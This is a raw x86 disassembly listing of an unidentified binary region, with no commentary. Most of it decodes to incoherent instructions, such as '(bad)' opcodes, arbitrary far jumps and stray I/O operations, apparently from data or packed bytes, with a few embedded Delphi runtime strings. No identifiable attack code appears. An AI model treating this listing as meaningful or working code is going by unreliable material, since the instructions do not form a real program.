  401f94:	or     DWORD PTR [ebx],eax
  401f96:	jne    0x401fd1
  401f98:	call   DWORD PTR [ebx+0x78]
  401f9b:	fucomp st(1)
  401f9d:	jae    0x401f95
  401f9f:	lock test esi,esi
  401fa2:	or     ah,BYTE PTR [esp+esi*2]
  401fa5:	sbb    esp,DWORD PTR [esi+0x4f]
  401fa8:	jmp    0x402025
  401faa:	sbb    ebx,DWORD PTR [ebx-0x5a0bed75]
  401fb0:	dec    eax
  401fb1:	dec    eax
  401fb2:	mov    eax,0x2f2f6369
  401fb7:	inc    esp
  401fb8:	cmp    dh,al
  401fba:	daa    
  401fbb:	push   es
  401fbc:	(bad)  
  401fbd:	mov    ch,cl
  401fbf:	shl    eax,0x10
  401fc2:	jmp    0x8905:0x66b70ff3
  401fc9:	ror    DWORD PTR [eax],1
  401fcb:	or     ebx,esi
  401fcd:	stos   DWORD PTR es:[edi],eax
  401fce:	mov    ecx,edx
  401fd0:	stos   BYTE PTR es:[edi],al
  401fd1:	pop    edi
  401fd2:	mov    esi,0x3f70d4d1
  401fd7:	sub    BYTE PTR [eax+0xc],dl
  401fda:	ins    BYTE PTR es:[edi],dx
  401fdb:	add    eax,0xccbfdb31
  401fe0:	div    dh
  401fe2:	sbb    ebx,edi
  401fe4:	add    BYTE PTR [edx+ecx*4],cl
  401fe7:	push   ds
  401fe8:	inc    esi
  401fe9:	je     0x40200b
  401feb:	je     0x401fe5
  401fed:	mov    ch,0x0
  401fef:	push   es
  401ff0:	sub    eax,0xcb046274
  401ff5:	retf   
  401ff6:	iret   
  401ff7:	repnz sub esi,DWORD PTR [edi+ebx*2+0x24]
  401ffc:	js     0x402072
  401ffe:	pop    edx
  401fff:	pop    eax
  402000:	je     0x402057
  402002:	xor    BYTE PTR ds:0x295af74f,cl
  402008:	daa    
  402009:	adc    DWORD PTR [eax+0x43],ecx
  40200c:	mov    ebx,0x8fedff20
  402011:	push   ss
  402012:	jne    0x402015
  402014:	sub    bl,0x30
  402017:	adc    DWORD PTR [ecx],ecx
  402019:	ja     0x402040
  40201b:	cmp    eax,edi
  40201d:	ja     0x402040
  40201f:	lea    esi,ds:0x4fdc3b8
  402025:	add    BYTE PTR [ecx],0xc0
  402028:	add    eax,ebx
  40202a:	sub    edi,edx
  40202c:	out    0xfe,al
  40202e:	int    0xe0
  402030:	out    dx,al
  402031:	(bad)  
  402032:	(bad)  
  402033:	mov    edi,0xeb547d69
  402038:	or     DWORD PTR [esi-0x15],eax
  40203b:	push   es
  40203c:	neg    eax
  40203e:	jle    0x40208b
  402040:	js     0x40208b
  402042:	pop    ebx
  402043:	sub    esi,ebx
  402045:	jmp    0x40208e
  402047:	inc    ch
  402049:	and    bl,ch
  40204b:	pushf  
  40204c:	mov    edi,0x96c76f6
  402051:	push   es
  402052:	cvtpi2ps xmm6,QWORD PTR [edi+ebx*8+0x41]
  402057:	popa   
  402058:	jb     0x40205d
  40205a:	dec    ecx
  40205b:	not    DWORD PTR [edi+0x4c20d9ed]
  402061:	jbe    0x40206e
  402063:	pop    es
  402064:	adc    DWORD PTR ds:0xc380d077,eax
  40206a:	or     dl,BYTE PTR [edi-0x49]
  40206d:	retf   
  40206e:	popa   
  40206f:	pop    ebx
  402070:	leave  
  402071:	into   
  402072:	add    al,0x55
  402074:	aad    0x75
  402076:	add    cl,BYTE PTR [ecx+ebx*2+0x31]
  40207a:	or     eax,0xf6ebc24f
  40207f:	mov    DWORD PTR [edx],esi
  402081:	aad    0xfb
  402083:	and    ecx,0xd6f30bff
  402089:	into   
  40208a:	xchg   DWORD PTR [edi-0x44bf125a],eax
  402090:	sbb    eax,0xd182e4c8
  402095:	sbb    BYTE PTR [ecx-0x18],0x7c
  402099:	dec    ebp
  40209a:	sti    
  40209b:	call   0xd9bf:0xfb7b14a2
  4020a2:	sub    DWORD PTR [ebp-0x7c3d767f],ecx
  4020a8:	loop   0x4020c9
  4020aa:	lea    edx,[edx+edx*4]
  4020ad:	fld    TBYTE PTR [ebx+edx*2-0x2180e1f4]
  4020b4:	bound  ebx,QWORD PTR [edi-0x17820279]
  4020ba:	add    eax,0xf157974
  4020bf:	je     0x4020cd
  4020c1:	pop    ss
  4020c2:	pop    ds
  4020c3:	mov    ch,0x4
  4020c5:	je     0x4020a1
  4020c7:	in     eax,0xb2
  4020c9:	mov    ecx,0x4310d761
  4020ce:	and    BYTE PTR [ebx-0x15],cl
  4020d1:	push   ebx
  4020d2:	jge    0x40209d
  4020d4:	jae    0x40213a
  4020d6:	(bad)  
  4020d7:	dec    eax
  4020d8:	jge    0x402120
  4020da:	inc    esp
  4020db:	stc    
  4020dc:	xor    al,0xfd
  4020de:	add    esi,edx
  4020e0:	pop    esp
  4020e1:	stc    
  4020e2:	sbb    al,0xf9
  4020e4:	jmp    0x4020f4
  4020e6:	fstp   st(0)
  4020e8:	fld    TBYTE PTR [ebx-0x34922600]
  4020ee:	xor    al,0x49
  4020f0:	add    al,0x9
  4020f2:	fldz   
  4020f4:	(bad)  
  4020f5:	enter  0x564,0x4e
  4020f9:	pop    ecx
  4020fa:	xor    BYTE PTR ds:0x90f23f09,0x83
  402101:	cmp    al,0xa0
  402103:	add    al,BYTE PTR [eax-0x38]
  402106:	add    eax,0xf20f08fa
  40210b:	and    BYTE PTR [edi],cl
  40210d:	inc    eax
  40210e:	pushf  
  40210f:	or     al,0x50
  402111:	ret    
  402112:	mov    esp,tr6
  402115:	adc    bl,BYTE PTR [edi-0x7fd81b04]
  40211b:	xchg   esi,eax
  40211c:	cwde   
  40211d:	push   ss
  40211e:	and    BYTE PTR [esi+edi*4-0x1194d7e7],bh
  402125:	xor    bh,BYTE PTR [edi]
  402127:	repnz xchg ebx,eax
  402129:	sbb    al,0xf9
  40212b:	add    dl,BYTE PTR [ebp+0x43b74020]
  402131:	mov    edx,0xcbb7e723
  402136:	test   DWORD PTR [edi],esp
  402138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402139:	aam    0x5f
  40213b:	and    eax,0x84e72a13
  402140:	xchg   ecx,eax
  402141:	sub    dh,bl
  402143:	lahf   
  402144:	(bad)  
  402145:	std    
  402146:	xor    ah,0x20
  402149:	out    0xb5,al
  40214b:	sub    eax,0xa931a009
  402150:	pop    edi
  402151:	jecxz  0x402183
  402153:	add    al,0xbf
  402155:	leave  
  402156:	sbb    ecx,DWORD PTR [esi+0x6fe6fe34]
  40215c:	inc    ch
  40215e:	cs mov esp,0x4037b1a2
  402164:	jbe    0x4021a0
  402166:	imul   ecx,DWORD PTR [ebx],0xffffffde
  402169:	cmp    ch,al
  40216b:	mov    DWORD PTR [ebx+eiz*1],eax
  40216e:	(bad)  
  40216f:	mov    bh,BYTE PTR [esi]
  402171:	das    
  402172:	jmp    ebp
  402174:	outs   dx,DWORD PTR ds:[esi]
  402175:	bound  ebp,QWORD PTR [ebp+eax*8+0x41ad78eb]
  40217c:	cmp    BYTE PTR [edx+0x17],0xb7
  402180:	xlat   BYTE PTR es:[ebx]
  402182:	fadd   DWORD PTR [eax+edx*4-0x54]
  402186:	outs   dx,BYTE PTR ds:[esi]
  402187:	dec    ebx
  402189:	jg     0x402184
  40218b:	xor    bh,BYTE PTR [eax-0x7a]
  40218e:	xchg   DWORD PTR [eax-0x4c],ecx
  402191:	push   edi
  402192:	or     bh,BYTE PTR [edi]
  402194:	push   ss
  402195:	push   0xeda14ba9
  40219a:	int3   
  40219b:	into   
  40219c:	sbb    eax,edx
  40219e:	ror    DWORD PTR [esi+0x40],cl
  4021a1:	(bad)  
  4021a2:	(bad)  
  4021a3:	(bad)  
  4021a4:	jmp    DWORD PTR [eax+0x61401484]
  4021aa:	push   ecx
  4021ab:	pop    ecx
  4021ac:	test   BYTE PTR [edx+0x40],dl
  4021af:	enter  0x19a5,0x90
  4021b3:	mov    ecx,0x55a56fa5
  4021b8:	inc    eax
  4021b9:	cmp    cl,BYTE PTR [edi]
  4021bb:	and    ah,dh
  4021bd:	daa    
  4021be:	(bad)  
  4021bf:	retf   
  4021c0:	into   
  4021c1:	pop    eax
  4021c2:	inc    eax
  4021c3:	test   BYTE PTR [ecx],cl
  4021c5:	(bad)  
  4021c6:	(bad)  
  4021c7:	(bad)  
  4021c8:	call   DWORD PTR [eax+edi*8-0x7ec0c688]
  4021cf:	pop    esp
  4021d0:	inc    eax
  4021d1:	in     eax,0xb
  4021d3:	mov    ecx,0x8f07d736
  4021d8:	mov    eax,ds:0x4edf405f
  4021dd:	addr16 add al,0xcd
  4021e0:	leave  
  4021e1:	repnz leave 
  4021e3:	bound  eax,QWORD PTR [eax-0x6a]
  4021e6:	and    al,BYTE PTR [ecx-0x120bb]
  4021ec:	inc    DWORD PTR [eax+0x7c]
  4021ef:	outs   dx,DWORD PTR ds:[esi]
  4021f0:	cld    
  4021f1:	gs inc eax
  4021f3:	sahf   
  4021f4:	mov    ch,0x70
  4021f6:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  4021fc:	inc    eax
  4021fd:	aad    0xa6
  4021ff:	iret   
  402200:	dec    DWORD PTR [ecx+0x1f]
  402203:	js     0x40225f
  402205:	inc    eax
  402206:	mov    ds:0xffff9b14,eax
  40220b:	(bad)  
  40220c:	inc    ebp
  40220e:	push   ss
  40220f:	stos   DWORD PTR es:[edi],eax
  402210:	mov    bl,0xef
  402212:	cmp    eax,0xe98ce041
  402217:	or     cl,0x47
  40221a:	mov    edx,0xaa41a893
  40221f:	pop    ss
  402220:	out    0x7f,al
  402222:	sub    esp,DWORD PTR [ecx+0x4212b616]
  402228:	imul   edx,DWORD PTR [ebp+0x27],0x39
  40222c:	(bad)  
  40222d:	dec    DWORD PTR [ebx]
  40222f:	(bad)  
  402230:	push   edi
  402232:	jo     0x402214
  402234:	jl     0x402278
  402236:	xor    cl,cl
  402238:	cmp    al,0xe3
  40223a:	call   DWORD PTR [esi+0x42e78a52]
  402240:	mov    fs,WORD PTR [ebp+ebx*4-0x55811405]
  402247:	push   ecx
  402248:	inc    ebx
  402249:	mov    WORD PTR [edi],gs
  40224b:	sbb    edi,esp
  40224d:	(bad)  
  40224e:	jmp    FWORD PTR [edx+0x5c]
  402251:	sbb    esp,edi
  402253:	sar    BYTE PTR es:[ebx-0x331c89bd],cl
  40225a:	repnz sub DWORD PTR [edi],ebp
  40225d:	test   BYTE PTR [ecx+0xad24426],al
  402263:	nop
  402264:	fist   DWORD PTR [ebx-0x5c]
  40226a:	call   FWORD PTR [edi-0x55e8bb70]
  402270:	clc    
  402271:	scas   al,BYTE PTR es:[edi]
  402272:	adc    bl,ah
  402274:	(bad)
  402277:	inc    esp
  402278:	pop    ecx
  402279:	pushf  
  40227a:	mov    al,0xe9
  40227c:	pop    es
  40227d:	pushf  
  40227e:	mov    dh,dl
  402280:	fs inc ebp
  402282:	aam    0xf3
  402284:	imul   ebx
  402286:	loope  0x4022d2
  402288:	jp     0x40221f
  40228a:	iret   
  40228b:	(bad)  
  40228c:	(bad)  
  40228d:	(bad)  
  40228e:	inc    DWORD PTR [ebp+0x62]
  402291:	mov    ds:0xd8dc0795,al
  402296:	ds mov eax,0x91c74639
  40229c:	push   cs
  40229d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40229e:	scas   al,BYTE PTR es:[edi]
  40229f:	mov    al,ds:0x46a3e319
  4022a4:	pop    ss
  4022a5:	or     al,0x75
  4022a7:	add    DWORD PTR [esi+0x48c97675],0x78b7e44d
  4022b1:	mov    eax,ds:0x3993a7ff
  4022b6:	cmp    esi,DWORD PTR ds:0x53edb2b8
  4022bc:	mov    ds:0x15dc53d,eax
  4022c1:	sahf   
  4022c2:	xchg   edx,eax
  4022c3:	(bad)  
  4022c4:	(bad)  
  4022c6:	call   FWORD PTR [edx-0x5a]
  4022c9:	lock mov eax,ds:0xa554c020
  4022cf:	mov    WORD PTR [edi],?
  4022d1:	popa   
  4022d2:	mov    ebx,DWORD PTR [edx+0x22]
  4022d5:	and    eax,0xdbf9895d
  4022da:	addr16 clc 
  4022dc:	repz daa 
  4022de:	mov    edi,0xff80c8a2
  4022e3:	(bad)  
  4022e4:	call   FWORD PTR [ebp-0x23]
  4022e7:	sub    BYTE PTR [esi-0x65],0x97
  4022eb:	and    BYTE PTR [edx-0x3b9fadfe],cl
  4022f1:	and    eax,0xd559f075
  4022f6:	outs   dx,BYTE PTR ds:[esi]
  4022f7:	bound  edx,QWORD PTR [ecx]
  4022f9:	xor    eax,0xc37bcaae
  4022fe:	push   ds
  4022ff:	test   al,0x55
  402301:	push   ds
  402302:	retf   
  402303:	lods   al,BYTE PTR ds:[esi]
  402304:	jnp    0x40237a
  402306:	and    BYTE PTR [ebx-0x75],ah
  402309:	std    
  40230a:	lods   eax,DWORD PTR ds:[esi]
  40230b:	adc    al,bh
  40230d:	pop    es
  40230e:	jne    0x40232c
  402310:	push   0x1
  402312:	or     ebx,DWORD PTR [edi+edi*8]
  402315:	stc    
  402316:	mov    ds:0xde55e03,al
  40231b:	mov    ds:0x7c5d02df,eax
  402320:	pop    eax
  402321:	sbb    BYTE PTR [edi+ecx*1-0xc],cl
  402325:	movzx  edi,WORD PTR [eax]
  402328:	inc    eax
  402329:	mov    ch,0xb5
  40232b:	mov    ds:0x8dba2089,al
  402330:	jns    0x402366
  402332:	push   0x2e
  402334:	jb     0x4022fa
  402336:	dec    ebp
  402337:	das    
  402338:	and    DWORD PTR [eax-0x753e3a98],eax
  40233e:	sbb    al,0x81
  402340:	xchg   esi,eax
  402341:	and    al,0x4d
  402343:	xor    esp,DWORD PTR [ecx]
  402345:	pop    ecx
  402346:	fldcw  WORD PTR [esi+0x7]
  402349:	xchg   esi,eax
  40234a:	clc    
  40234b:	hlt    
  40234c:	jp     0x40237d
  40234e:	hlt    
  40234f:	push   eax
  402350:	xor    edi,eax
  402352:	bound  esi,QWORD PTR [eax-0x63ff9b1e]
  402358:	mov    edx,0x6c87122c
  40235d:	dec    ebx
  40235e:	rcl    DWORD PTR ds:0x2ec71c60,1
  402364:	fidivr WORD PTR [edx+0xf]
  402367:	out    dx,eax
  402368:	mov    ax,ds:0xffc0eb70
  40236e:	data16 adc dh,al
  402371:	call   0x2da6c973
  402376:	aas    
  402377:	or     ax,dx
  40237a:	mov    ds:0xffffac14,ax
  402380:	jmp    FWORD PTR [edi]
  402382:	sbb    ecx,DWORD PTR [edi+0x46]
  402385:	push   esp
  402386:	push   edi
  402387:	inc    ecx
  402388:	push   edx
  402389:	inc    ebp
  40238a:	pop    esp
  40238b:	inc    edx
  40238c:	outs   dx,DWORD PTR ds:[esi]
  40238d:	jb     0x4023fb
  40238f:	popa   
  402390:	outs   dx,BYTE PTR ds:[esi]
  402391:	fs pop esp
  402393:	inc    esp
  402394:	gs ins BYTE PTR es:[edi],dx
  402396:	jo     0x402400
  402398:	imul   ebx,DWORD PTR [edx+edx*2+0x54],0x87fb004c
  4023a0:	loopne 0x4023a1
  4023a2:	inc    esi
  4023a3:	push   eax
  4023a4:	push   ebp
  4023a5:	dec    ebp
  4023a6:	popa   
  4023a7:	jae    0x402414
  4023a9:	push   esi
  4023aa:	popa   
  4023ab:	ins    BYTE PTR es:[edi],dx
  4023ac:	jne    0x4023c5
  4023ae:	fninit 
  4023b0:	fldcw  WORD PTR ds:0xb624139
  4023b7:	shr    ebx,cl
  4023b9:	adc    al,BYTE PTR [eax]
  4023bb:	repnz dec ebp
  4023bd:	(bad)  
  4023be:	out    dx,eax
  4023bf:	push   0xffffffdb
  4023c1:	adc    edx,edi
  4023c3:	mov    esi,DWORD PTR [eax-0x2c]
  4023c6:	xor    ecx,ecx
  4023c8:	mov    cl,BYTE PTR [esi]
  4023ca:	inc    ecx
  4023cb:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023cd:	lock push 0x5d
  4023d0:	dec    ebx
  4023d1:	push   esp
  4023d2:	fdiv   st(0),st
  4023d4:	add    ah,BYTE PTR ds:0x4777b317
  4023da:	mov    al,ds:0x10229c5b
  4023df:	add    al,0x19
  4023e1:	mov    al,ds:0xf10dd08b
  4023e6:	mov    ecx,0x5b54d81a
  4023eb:	sbb    ecx,DWORD PTR [ecx-0x769f2fe3]
  4023f1:	mov    cl,0xd
  4023f3:	jnp    0x4023b5
  4023f5:	fdiv   DWORD PTR [edi]
  4023f7:	test   bh,ch
  4023f9:	or     BYTE PTR [ebx-0x52],cl
  4023fc:	fist   DWORD PTR ds:0x9c241620
  402402:	or     ecx,DWORD PTR [edi]
  402404:	or     BYTE PTR [ebp+0x64],ch
  402407:	fdivr  QWORD PTR [esi-0x7a]
  40240a:	into   
  40240b:	pop    DWORD PTR ds:0x4252f68
  402411:	sbb    BYTE PTR [esi+0x5],bh
  402414:	lock or edi,DWORD PTR [ebx+0x7037ecf6]
  40241b:	pop    es
  40241c:	mov    dl,0x6e
  40241e:	or     bh,bh
  402420:	push   ecx
  402421:	cld    
  402422:	ret    
  402423:	sbb    ebp,DWORD PTR [edi+edi*4+0x3d]
  402427:	jnp    0x4023ec
  402429:	xchg   esi,eax
  40242a:	stos   DWORD PTR es:[edi],eax
  40242b:	mov    ecx,DWORD PTR [ebx-0x28]
  40242e:	xor    DWORD PTR [ecx+eax*8-0x7748b6b9],ebp
  402435:	rol    BYTE PTR [edx],0x99
  402438:	pop    ecx
  402439:	cwde   
  40243a:	inc    eax
  40243b:	mov    edx,esp
  40243d:	push   cs
  40243e:	outs   dx,BYTE PTR ds:[esi]
  40243f:	pop    ebp
  402440:	ins    BYTE PTR es:[edi],dx
  402441:	adc    eax,0xc40182b8
  402446:	pop    ebx
  402447:	fdivr  QWORD PTR [edx]
  402449:	aam    0x52
  40244b:	inc    DWORD PTR [edx+0x42]
  40244e:	sbb    ebp,ebx
  402450:	in     eax,dx
  402451:	cmp    esp,edx
  402453:	je     0x402472
  402455:	mov    edi,0xc0dfdb0b
  40245a:	lods   eax,DWORD PTR ds:[esi]
  40245b:	mov    dl,0xd
  40245d:	jae    0x40246f
  40245f:	inc    DWORD PTR [esi]
  402461:	mov    edi,DWORD PTR [ebx+0x14]
  402464:	mov    DWORD PTR [edi+eax*1],esi
  402467:	nop    DWORD PTR [eax+0x41]
  40246b:	test   al,0xdd
  40246d:	dec    ecx
  40246e:	jne    0x40248c
  402470:	jne    0x402455
  402472:	xchg   ebx,eax
  402473:	push   esi
  402474:	push   0xd997f6b6
  402479:	mov    edx,DWORD PTR ss:[esi-0x40]
  40247d:	mov    esi,DWORD PTR [esi+0x3c]
  402480:	xchg   ebp,eax
  402481:	pop    es
  402482:	xor    eax,0xb60ebbdd
  402487:	(bad)  
  402488:	fdivr  DWORD PTR ds:0xd18721e9
  40248e:	cmp    ecx,0x5b78ff9e
  402494:	cli    
  402495:	fdiv   DWORD PTR [ebx+0x11]
  402498:	pop    es
  402499:	(bad)  
  40249a:	jb     0x4024a3
  40249c:	movsx  eax,WORD PTR [ebx]
  40249f:	xchg   edx,eax
  4024a0:	and    edi,edi
  4024a2:	loope  0x402465
  4024a4:	ins    DWORD PTR es:[edi],dx
  4024a5:	mov    eax,ds:0x3e003419
  4024aa:	rol    DWORD PTR [eax-0x73c7ee75],0xe
  4024b1:	sbb    eax,0x2727a440
  4024b6:	push   edi
  4024b7:	mov    cl,0x50
  4024b9:	or     eax,0xd9b54fd0
  4024be:	jmp    0x4d5748b3
  4024c3:	sahf   
  4024c4:	add    BYTE PTR [ebx],ah
  4024c6:	mov    ?,WORD PTR [eax]
  4024c8:	xchg   esp,eax
  4024c9:	push   es
  4024ca:	xor    DWORD PTR [esi-0x7f],0x4b
  4024ce:	and    ebx,DWORD PTR [ebx+eax*8-0x4cbfa4c8]
  4024d5:	push   eax
  4024d6:	bound  edx,QWORD PTR [esp+edx*1]
  4024d9:	adc    dl,dh
  4024db:	mov    ds:0x89dd002d,al
  4024e0:	adc    ecx,DWORD PTR [ecx+0x798b2d24]
  4024e6:	sbb    al,0x83
  4024e8:	fist   WORD PTR [edi+0x4d8d1a1a]
  4024ee:	clc    
  4024ef:	and    BYTE PTR [eax+0x18],dl
  4024f2:	les    esp,FWORD PTR [edx]
  4024f4:	int3   
  4024f5:	(bad)  [eax]
  4024f7:	ja     0x402529
  4024f9:	cli    
  4024fa:	pop    esi
  4024fb:	jae    0x402485
  4024fd:	setne  BYTE PTR [edi-0x454e7f1d]
  402504:	fdiv   DWORD PTR ds:0x1c589523
  40250a:	mov    WORD PTR [esi-0x6d],fs
  40250d:	cmovb  edi,esp
  402510:	lock mov eax,ebx
  402513:	pop    edi
  402514:	out    dx,eax
  402515:	pop    ebp
  402516:	adc    eax,0xb83825ba
  40251b:	push   0x8b165829
  402520:	(bad)  [edi]
  402522:	jmp    0x7252:0x303b32ea
  402529:	ins    BYTE PTR es:[edi],dx
  40252a:	jo     0x402530
  40252c:	jne    0x40253e
  40252e:	pop    es
  40252f:	or     ch,ch
  402531:	push   edx
  402532:	sub    eax,0x875082f
  402537:	or     al,0x2d
  402539:	je     0x40254e
  40253b:	and    BYTE PTR [ecx+0x2d0d0970],ah
  402541:	fcom   QWORD PTR [ebp-0x3b]
  402544:	jnp    0x402559
  402546:	push   0xffffffa8
  402548:	fwait
  402549:	nop
  40254a:	xchg   ebx,eax
  40254b:	adc    cl,BYTE PTR ds:0x39c8038b
  402551:	xor    bl,BYTE PTR [ebx+0x344c2404]
  402557:	sbb    eax,DWORD PTR [ebx-0x5d]
  40255a:	addr16 push eax
  40255c:	ficom  DWORD PTR [edi+0x57]
  40255f:	xchg   esi,eax
  402560:	sbb    eax,0xb6971655
  402565:	bound  edi,QWORD PTR [esi-0x30]
  402568:	mov    eax,0x510f260d
  40256d:	sub    eax,0xf8961e1b
  402572:	add    dh,dl
  402574:	scas   ax,WORD PTR es:[edi]
  402576:	jne    0x4025d1
  402578:	data16 idiv BYTE PTR [esi-0x3d]
  40257c:	pop    eax
  40257d:	call   0xee4721dc
  402582:	sub    eax,ecx
  402584:	mov    esi,DWORD PTR [edi+eax*2+0x42]
  402588:	xchg   edi,eax
  402589:	push   eax
  40258a:	fstp   TBYTE PTR [ebp+0x4980e7f1]
  402590:	add    al,0x59
  402592:	pop    eax
  402593:	gs jmp esi
  402596:	pop    ecx
  402597:	mov    ecx,0x7717f01b
  40259c:	mov    esi,es
  40259e:	popf   
  40259f:	inc    ebp
  4025a0:	add    BYTE PTR [ecx],bh
  4025a2:	shl    BYTE PTR [edi],1
  4025a4:	jg     0x40261b
  4025a6:	repz pop edi
  4025a8:	in     al,dx
  4025a9:	mov    ecx,0xb8170d86
  4025ae:	jbe    0x402530
  4025b0:	sbb    esp,DWORD PTR [edi+0x3]
  4025b3:	add    al,0x5c
  4025b5:	mov    eax,0xc966563d
  4025ba:	or     si,sp
  4025bd:	pop    ss
  4025be:	dec    bp
  4025c0:	or     eax,0xc026b0b6
  4025c5:	icebp  
  4025c6:	push   eax
  4025c7:	dec    esi
  4025c8:	pop    eax
  4025c9:	fs icebp 
  4025cb:	test   DWORD PTR [esi-0x53a17a72],esi
  4025d1:	pop    esi
  4025d2:	inc    esi
  4025d3:	popa   
  4025d4:	push   eax
  4025d5:	nop
  4025d6:	test   BYTE PTR ds:0x538dc2f5,0x61
  4025dd:	jl     0x4025e2
  4025df:	push   ebp
  4025e0:	hlt    
  4025e1:	xor    edx,edx
  4025e3:	clc    
  4025e4:	fs lock dec ebp
  4025e7:	fucomip st,st(0)
  4025e9:	mov    ebx,DWORD PTR [edx]
  4025eb:	mov    DWORD PTR [eax+0x41c70869],ebp
  4025f1:	xchg   ebp,eax
  4025f2:	and    al,0xc9
  4025f4:	mov    DWORD PTR [ecx+0xc],eax
  4025f7:	jge    0x4025ee
  4025f9:	mov    al,0xb0
  4025fb:	inc    esp
  4025fc:	or     ch,BYTE PTR [ebx]
  4025fe:	pop    edx
  4025ff:	cmp    ah,BYTE PTR [esi]
  402601:	pop    edi
  402602:	sub    al,0x8e
  402604:	xchg   edi,eax
  402605:	xchg   BYTE PTR [esi-0x41],dl
  402608:	sub    eax,0x5081b20e
  40260d:	mov    DWORD PTR [esp+eiz*4+0x5d],edi
  402611:	mov    WORD PTR [eax-0x64],ds
  402614:	add    al,0x27
  402616:	nop
  402617:	pop    ss
  402618:	adc    bh,bh
  40261a:	push   edx
  40261b:	clc    
  40261c:	jle    0x4025da
  40261e:	mov    esi,0xe40cf761
  402623:	push   ds
  402624:	jmp    0x4026a5
  402626:	add    ebp,edx
  402628:	sbb    bh,BYTE PTR [ebp-0x72]
  40262b:	fs adc eax,ebp
  40262e:	pop    ebx
  40262f:	ja     0x40267e
  402631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402632:	or     edi,DWORD PTR ds:0x76e3409a
  402638:	adc    eax,esi
  40263a:	repnz fbstp TBYTE PTR [esi-0x517b93d]
  402641:	in     eax,dx
  402642:	push   cs
  402643:	cs adc al,0x1b
  402646:	add    BYTE PTR [ebx-0x16db91b0],bh
  40264c:	fidiv  WORD PTR [eax]
  40264e:	push   esp
  40264f:	push   0x2
  402651:	sbb    eax,0x58084ce4
  402656:	xor    ah,BYTE PTR [eax]
  402658:	int    0xf6
  40265a:	addr16 pop ss
  40265c:	add    eax,esp
  40265e:	add    al,0xe9
  402660:	in     eax,dx
  402661:	ds sub al,0x57
  402664:	pop    es
  402665:	push   eax
  402666:	push   ebx
  402667:	mov    cl,0x25
  402669:	push   esp
  40266a:	adc    ecx,DWORD PTR [edx]
  40266c:	hlt    
  40266d:	pop    ebx
  40266e:	mov    DWORD PTR [edi+0x1418b19],edi
  402674:	cmp    BYTE PTR [ecx],0xe9
  402677:	dec    ecx
  402678:	add    al,0xeb
  40267a:	jne    0x402688
  40267c:	movsx  edi,BYTE PTR [ecx+0x656e85c6]
  402683:	inc    ecx
  402684:	jmp    0x402636
  402686:	rol    DWORD PTR ds:0x7d9c9bad,0x52
  40268d:	xchg   DWORD PTR [ebx],esi
  40268f:	sbb    eax,0x51802504
  402694:	pop    ebp
  402695:	loope  0x402683
  402697:	xor    DWORD PTR ds:0x12b32b92,0x98761f52
  4026a1:	fwait
  4026a2:	in     al,0xe2
  4026a4:	pop    edx
  4026a5:	ficomp DWORD PTR ds:0xc01ab210
  4026ab:	pop    ebp
  4026ac:	jbe    0x402691
  4026ae:	sbb    al,0x58
  4026b0:	arpl   WORD PTR [edi+esi*8+0x1d],si
  4026b4:	fld    QWORD PTR [ebp+eiz*4-0x3c]
  4026b8:	jle    0x4026c9
  4026ba:	test   DWORD PTR [ebx],edx
  4026bc:	xchg   esp,eax
  4026bd:	add    DWORD PTR [edx+0x38dc3e85],0x48c221de
  4026c7:	lock outs dx,BYTE PTR ds:[esi]
  4026c9:	ins    DWORD PTR es:[edi],dx
  4026ca:	mov    cl,0xf4
  4026cc:	out    dx,al
  4026cd:	add    al,0x21
  4026cf:	test   al,0x8b
  4026d1:	das    
  4026d2:	pushf  
  4026d3:	shl    BYTE PTR [ecx-0xf],cl
  4026d6:	push   esp
  4026d7:	sub    di,WORD PTR [ebx+eiz*2]
  4026db:	shl    BYTE PTR [edi+0x9],cl
  4026de:	out    0x7d,eax
  4026e0:	inc    DWORD PTR ds:0x81488de0
  4026e6:	cmp    esi,ecx
  4026e8:	cli    
  4026e9:	out    dx,eax
  4026ea:	push   cs
  4026eb:	je     0x402724
  4026ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ee:	xor    BYTE PTR [eax],bh
  4026f0:	or     BYTE PTR [edi],dh
  4026f2:	mov    ch,BYTE PTR [edi+0x65]
  4026f5:	jbe    0x402720
  4026f7:	cs ja  0x40271a
  4026fa:	mov    dl,0x81
  4026fc:	xchg   BYTE PTR [ecx],al
  4026fe:	imul   esi,DWORD PTR [edi],0xffffffb4
  402701:	add    DWORD PTR [esi+esi*4+0x17],esi
  402705:	mov    ebp,ebp
  402707:	add    BYTE PTR [eax+0x3b],bl
  40270a:	stos   DWORD PTR es:[edi],eax
  40270b:	pushf  
  40270c:	jp     0x402772
  40270e:	or     al,0xe4
  402710:	mov    bl,0x64
  402712:	test   DWORD PTR ds:0x76013a0a,ecx
  402718:	push   ds
  402719:	xchg   BYTE PTR [ebp+0x4d],ch
  40271c:	cmp    eax,0x84e5015
  402721:	std    
  402722:	push   eax
  402723:	cmp    al,0x81
  402725:	mov    ecx,DWORD PTR [ebp+0x7074efee]
  40272b:	sub    DWORD PTR [ecx+0x33adf302],0xffffffdc
  402732:	sub    ch,ch
  402734:	adc    eax,0x871c531b
  402739:	sub    dl,bl
  40273b:	stos   BYTE PTR es:[edi],al
  40273c:	jne    0x40272d
  40273e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40273f:	push   eax
  402740:	push   ebx
  402741:	es loopne 0x402796
  402744:	fdivr  QWORD PTR [ebp-0x390ed84]
  40274a:	mov    esi,0xb0ff4347
  40274f:	add    BYTE PTR [ebp-0x60],ch
  402752:	add    eax,0x5f9f6f8b
  402757:	add    al,0xc7
  402759:	rcr    edi,cl
  40275b:	(bad)  
  40275c:	mov    es,WORD PTR [edi+0x42]
  40275f:	daa    
  402760:	or     al,0x61
  402762:	add    eax,0xe3ff6caf
  402767:	jge    0x4027b4
  402769:	lea    ebx,[ebp-0x7784cf2c]
  40276f:	adc    DWORD PTR es:[esi+0x0],esi
  402773:	or     BYTE PTR [edi+0x8413eee],ch
  402779:	sbb    ah,BYTE PTR [edx]
  40277b:	dec    eax
  40277c:	mov    eax,0x20fb2b29
  402781:	cwde   
  402782:	and    BYTE PTR [edi],al
  402784:	das    
  402785:	je     0x4027a6
  402787:	mov    ecx,DWORD PTR [edx+0x4c]
  40278a:	dec    edx
  40278b:	loopne 0x40270f
  40278d:	addr16 inc edx
  40278f:	fs jp  0x4027b0
  402792:	xor    BYTE PTR [edi],al
